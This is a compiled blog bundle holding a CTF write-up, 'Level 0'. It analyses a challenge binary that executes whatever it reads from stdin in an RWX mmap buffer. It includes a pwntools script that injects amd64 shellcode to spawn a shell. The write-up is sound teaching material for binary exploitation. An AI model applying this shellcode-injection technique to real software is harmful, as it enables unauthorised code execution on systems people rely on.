"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[7959],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>d});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},l=Object.keys(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),c=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,l=e.originalType,s=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),h=c(n),d=a,m=h["".concat(s,".").concat(d)]||h[d]||u[d]||l;return n?r.createElement(m,o(o({ref:t},p),{},{components:n})):r.createElement(m,o({ref:t},p))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var l=n.length,o=new Array(l);o[0]=h;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i.mdxType="string"==typeof e?e:a,o[1]=i;for(var c=2;c<l;c++)o[c]=n[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},4161:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>o,default:()=>u,frontMatter:()=>l,metadata:()=>i,toc:()=>c});var r=n(7462),a=(n(7294),n(3905));const l={slug:"level-0",title:"Level 0",authors:["nguyen"],tags:["CTF","Binary Exploitation"]},o=void 0,i={permalink:"/blog/level-0",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-07-level-0.md",source:"@site/blog/2022-02-07-level-0.md",title:"Level 0",description:"CTF: Level 0",date:"2022-02-07T00:00:00.000Z",formattedDate:"February 7, 2022",tags:[{label:"CTF",permalink:"/blog/tags/ctf"},{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"}],readingTime:1.74,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"level-0",title:"Level 0",authors:["nguyen"],tags:["CTF","Binary Exploitation"]},prevItem:{title:"Hidden Flag Function",permalink:"/blog/hidden_flag_function"},nextItem:{title:"Clutter Overflow",permalink:"/blog/clutter_overflow"}},s={authorsImageUrls:[void 0]},c=[{value:"The Challenge",id:"the-challenge",level:2},{value:"Analysis",id:"analysis",level:2}],p={toc:c};function u(e){let{components:t,...l}=e;return(0,a.kt)("wrapper",(0,r.Z)({},p,l,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"CTF: Level 0"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"/files/level_0/level-0"},"Executable used for the challenge")),(0,a.kt)("p",null,"To download the challenge, right click the link and open in a new tab."),(0,a.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,a.kt)("p",null,"Level 0 provides an amd64 executable where the goal is to get the executable to open a shell."),(0,a.kt)("h2",{id:"analysis"},"Analysis"),(0,a.kt)("p",null,"I decided to first use ghidra to have a better understanding of the program. In ghidra, I look for _start() as that as normally the entry point of a program."),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"_start()",src:n(3379).Z,width:"498",height:"280"})),(0,a.kt)("p",null,"_start() calls main so I looked into main next."),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"main()",src:n(238).Z,width:"494",height:"248"})),(0,a.kt)("p",null,"I looked into init_chal and found that SIGALRM is sent 30 seconds after running the program. I ran the program and waited to see what would happen. It resulted in an output of 'Alarm clock' to the terminal before exiting the program. I noticed that the stdin and stdout buffers were both set to be unbuffered."),(0,a.kt)("p",null,"I went back to the main function and noticed memory is allocated to a buffer through the usage of mmap. Looking into the arguments that are used in mmap, I saw that the prot field contained read, write, and execute for the page. The length of the mapping is 4096 bytes. After memory has been allocated, read is called to read stdin into the buffer up to 4096 bytes. The buffer is called as a function pointer to be executed before returning."),(0,a.kt)("p",null,"This makes it clear that I need to send instructions through stdin in order to open a shell."),(0,a.kt)("p",null,"I accomplish this with the following code."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nexe = ELF(\"./level-0\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\n\ndef conn():\n    '''Establish the connection to the file\n    '''\n\n    io = process([exe.path])\n    return io\n\n\ndef main():\n    '''Pop open a shell\n    '''\n\n    with conn() as io:\n        shellcode = asm(shellcraft.amd64.linux.sh())\n        io.sendline(shellcode)\n        io.interactive()\n\n\nif __name__ == '__main__':\n    main()\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"shellcraft.amd64.linux.sh()")," contained the instructions for opening a shell and I used ",(0,a.kt)("inlineCode",{parentName:"p"},"asm()")," in order to convert assembly into bytes. The shellcode is then sent directly to the program."),(0,a.kt)("p",null,"I ran this script and was able to access a shell from within the level-0 program."))}u.isMDXComponent=!0},238:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/level0_main-2b3cdd697b90fd9d3460a8df1b569515.png"},3379:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/level0_start-aec4626c9045295b84a4b20a1b4d544c.png"}}]);